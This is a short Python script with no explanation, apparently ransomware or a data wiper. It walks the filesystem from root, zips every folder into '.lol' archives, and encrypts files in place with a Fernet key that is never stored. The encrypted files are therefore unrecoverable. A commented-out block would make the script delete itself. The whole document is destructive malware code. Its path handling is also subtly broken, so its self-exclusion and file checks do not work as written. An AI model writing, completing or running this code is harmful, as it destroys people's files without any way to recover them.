import os
from cryptography.fernet import Fernet
import zipfile
def zip_folders(directory):
    for root, dirs, files in os.walk(directory):
        for dir_name in dirs:
            folder_path = os.path.join(root, dir_name)
            zip_filename = f"{dir_name}.lol"
            with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for folder_root, _, folder_files in os.walk(folder_path):
                    for file in folder_files:
                        file_path = os.path.join(folder_root, file)
                        arcname = os.path.relpath(file_path, folder_path)
                        zipf.write(file_path, arcname)

files = []
key = Fernet.generate_key()
zip_folders("/")
for file in os.listdir("/"):
  if file == os.path.abspath(__file__):
    continue
  if os.path.isfile(file):
    files.append(file)
for file in files:
  with open(file, "rb") as thefile:
    contents = thefile.read()
  contents_encrypted = Fernet(key).encrypt(contents)
  with open(file, "wb") as thefile:
    thefile.write(contents_encrypted)
'''script_path = os.path.abspath(__file__)
os.remove(script_path)'''
